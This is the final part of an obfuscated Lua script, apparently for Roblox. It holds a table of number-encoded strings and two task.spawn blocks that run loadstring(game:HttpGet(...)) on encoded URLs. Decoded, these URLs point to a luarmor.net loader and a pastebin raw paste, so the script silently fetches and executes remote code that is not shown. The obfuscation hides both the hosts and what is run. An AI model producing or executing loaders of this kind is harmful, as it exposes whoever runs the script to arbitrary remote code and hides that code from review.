  _OlllOIlOIO00OllI(106,80,94,84,88,25,123,86,64),
  _OlllOIlOIO00OllI(105,80,25,105,80,25,110,88,77,92,75,84,92,85,86,87),
  _OlllOIlOIO00OllI(104,76,88,90,82,76,85,88),
  _OlllOIlOIO00OllI(105,88,87,93,88,90,90,80,87,80,25,123,88,87,88,87,80,87,80),
  _OlllOIlOIO00OllI(122,86,90,86,74,80,87,80,25,116,88,84,88),
  _OlllOIlOIO00OllI(106,77,75,88,78,91,92,75,75,92,85,85,80,25,127,85,88,84,80,87,94,92,85,85,80),
  _OlllOIlOIO00OllI(105,80,73,80,25,105,86,77,88,77,86),
  _OlllOIlOIO00OllI(122,88,75,88,84,92,85,85,86,25,127,80,85,77,75,92,85,85,86),
  _OlllOIlOIO00OllI(123,85,76,92,91,92,75,75,80,87,87,80,25,118,90,77,86,73,76,74,80,87,80),
  _OlllOIlOIO00OllI(122,85,80,90,82,92,75,80,87,86,25,122,75,88,91,86),
  _OlllOIlOIO00OllI(104,76,80,79,80,86,85,80,25,120,84,92,85,92,86,87,87,80),
  _OlllOIlOIO00OllI(126,85,86,75,91,86,25,127,75,76,77,77,86,93,75,80,85,85,86),
  _OlllOIlOIO00OllI(117,80,86,87,92,85,25,122,88,90,77,76,74,92,85,80),
  _OlllOIlOIO00OllI(122,81,92,95,25,122,75,88,91,75,88,90,88,93,88,91,75,88),
  _OlllOIlOIO00OllI(123,88,85,85,92,75,80,87,88,25,122,88,73,73,76,90,90,80,87,88),
  _OlllOIlOIO00OllI(116,76,84,84,80,86,25,107,88,73,73,80,77,77,86),
  _OlllOIlOIO00OllI(105,92,87,94,76,80,87,86,25,122,86,90,86,74,80,87,86),
  _OlllOIlOIO00OllI(122,81,80,84,73,88,87,67,80,87,80,25,123,88,87,88,87,80,87,80),
  _OlllOIlOIO00OllI(110,86,84,91,86,25,107,86,85,85,86),
  _OlllOIlOIO00OllI(105,92,87,94,76,80,87,25,109,75,92,92),
  _OlllOIlOIO00OllI(125,86,80,25,125,86,80,25,125,86),
  _OlllOIlOIO00OllI(106,88,85,88,84,80,87,86,25,105,92,87,94,76,80,87,86),
  _OlllOIlOIO00OllI(127,75,86,94,88,77,86,25,105,80,75,88,77,86),
  _OlllOIlOIO00OllI(116,88,87,94,86,85,80,87,80,25,105,88,75,75,86,90,80,87,80),
  _OlllOIlOIO00OllI(120,79,86,90,88,93,80,87,80,25,126,76,95,95,86),
  _OlllOIlOIO00OllI(109,80,25,109,80,25,109,80,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(123,76,75,91,88,85,86,87,80,25,117,86,85,80,85,86,85,80),
  _OlllOIlOIO00OllI(123,75,75,80,25,123,75,75,80,25,123,80,90,76,74,25,125,80,90,76,74,25,123,86,84,91,80,90,76,74),
  _OlllOIlOIO00OllI(105,92,75,86,90,81,92,85,85,86,25,117,92,84,86,87,90,81,92,85,85,86),
  _OlllOIlOIO00OllI(123,88,87,88,87,80,77,88,25,125,86,85,73,81,80,87,80,77,88),
  _OlllOIlOIO00OllI(116,88,85,88,84,92,25,120,84,88,75,92,85,92),
  _OlllOIlOIO00OllI(123,88,84,91,80,87,80,25,122,75,86,74,77,80,87,80),
  _OlllOIlOIO00OllI(109,75,76,85,80,84,92,75,86,25,109,75,76,85,80,90,80,87,88),
  _OlllOIlOIO00OllI(120,79,86,90,88,93,80,87,80,25,120,87,77,80,85,86,73,80,87,80),
  _OlllOIlOIO00OllI(123,75,75,25,123,75,75,25,105,88,77,88,73,80,84),
  _OlllOIlOIO00OllI(123,88,87,93,80,77,86,25,120,65,86,85,80,77,86),
  _OlllOIlOIO00OllI(122,88,73,73,76,90,90,80,87,86,25,120,74,74,88,74,74,80,87,86),
  _OlllOIlOIO00OllI(105,80,87,92,88,85,86,77,77,86,25,127,75,76,77,77,88,75,80,87,86),
  _OlllOIlOIO00OllI(105,80,73,80,25,120,79,86,90,88,93,86),
  _OlllOIlOIO00OllI(127,75,86,94,86,25,124,85,95,86),
  _OlllOIlOIO00OllI(109,75,80,90,25,109,75,88,90,25,123,88,75,88,91,86,86,84),
  _OlllOIlOIO00OllI(122,76,73,90,88,82,92,25,114,86,88,85,88),
  _OlllOIlOIO00OllI(109,88,25,109,88,25,109,88,25,109,88,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(122,88,90,77,86,25,113,80,73,86,73,86,77,88,84,86),
  _OlllOIlOIO00OllI(123,86,87,92,90,88,25,120,84,91,88,85,88,91,76),
  _OlllOIlOIO00OllI(123,88,87,93,80,77,86,25,123,86,91,75,80,77,77,86),
  _OlllOIlOIO00OllI(126,88,87,94,74,77,92,75,25,127,86,86,77,92,75,88),
  _OlllOIlOIO00OllI(109,75,80,73,73,80,25,109,75,86,73,73,80),
  _OlllOIlOIO00OllI(105,80,73,80,25,122,86,75,87,80),
  _OlllOIlOIO00OllI(105,80,73,80,25,114,80,78,80),
  _OlllOIlOIO00OllI(109,88,75,77,88,75,88,94,87,86),
  _OlllOIlOIO00OllI(107,88,90,90,86,86,87,80,25,115,88,87,93,92,85,80,87,80),
  _OlllOIlOIO00OllI(119,86,86,91,80,87,80,25,106,88,87,77,88,87,80,87,80),
  _OlllOIlOIO00OllI(106,79,80,87,80,87,88,25,123,86,84,91,88,75,93,80,87,86),
  _OlllOIlOIO00OllI(109,88,85,73,88,25,125,80,25,127,92,75,86),
  _OlllOIlOIO00OllI(127,85,76,75,80,95,85,76,75,88),
  _OlllOIlOIO00OllI(109,80,84,25,122,81,92,92,74,92),
  _OlllOIlOIO00OllI(117,80,75,80,85,213,25,117,88,75,80,85,217),
  _OlllOIlOIO00OllI(119,86,86,91,80,87,80,25,105,80,67,67,88,87,80,87,80)
}

task.spawn(function()
loadstring(game:HttpGet(_OlllOIlOIO00OllI(81,77,77,73,74,3,22,22,88,73,80,23,85,76,88,75,84,86,75,23,87,92,77,22,95,80,85,92,74,22,79,13,22,85,86,88,93,92,75,74,22,1,9,1,95,13,88,93,13,92,91,95,95,13,14,12,90,12,14,90,92,15,8,92,88,10,0,92,13,8,92,11,10,23,85,76,88)))()
end)

task.spawn(function()
loadstring(game:HttpGet(_OlllOIlOIO00OllI(81,77,77,73,74,3,22,22,73,88,74,77,92,91,80,87,23,90,86,84,22,75,88,78,22,117,75,91,78,94,83,72,14)))()
end)

end;
local _,_OII00OII=pcall(_I0I0IIOIlII0);if _Ill0OOIO then _I0I0IIOIlII0()end;
